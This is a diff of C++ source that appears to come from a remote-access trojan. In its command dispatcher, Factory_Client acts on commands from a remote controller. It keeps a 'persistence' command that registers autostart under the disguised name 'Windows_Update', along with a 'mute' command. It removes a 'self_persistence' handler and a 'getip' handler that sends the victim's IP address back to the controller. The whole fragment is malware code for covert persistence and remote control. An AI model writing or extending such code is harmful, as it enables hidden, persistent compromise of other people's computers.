@@ -25,21 +25,13 @@ Factory_Client::Factory_Client(Client* clientp, const char* pbuffer) : buffer(pb
 {
 	args = split(pbuffer);
 
-	if (args[0] == "self_persistence")
-	{
-		arg_self_persistence();
-	}
-	else if (args[0] == "persistence" && args.size() == 3)
+	if (args[0] == "persistence" && args.size() == 3)
 	{
 		persistence(client,args[1], (wchar_t*)args[2].c_str());
 	}
 	else if (args[0] == "persistence" && args.size() == 2)
 	{
 		persistence(client, args[1],L"Windows_Update");
-	}
-	else if (args[0] == "getip" && args.size() == 1)
-	{
-		client->send_b(AutoStart::get_ip().c_str());
 	}
 	else if (args[0] == "mute" && args.size() == 1)
 	{
@@ -136,19 +128,4 @@ Factory_Client::Factory_Client(Client* clientp, const char* pbuffer) : buffer(pb
 			client->send_b(("Command " + buffer + " not found").c_str());
 		}
 
-}
-
-void Factory_Client::arg_self_persistence()
-{
-	std::string keyname;
-	if (args.size() == 2)
-		keyname = args[1];
-	else
-		keyname = "Windows_update";
-
-	std::wstring_convert< std::codecvt<wchar_t, char, std::mbstate_t> > conv;
-	std::wstring wstr = conv.from_bytes(keyname);
-	client->send_b("Putting persistence with keyname : ");
-	client->send_b(keyname.c_str());
-	AutoStart::persistence(wstr.c_str());
 }
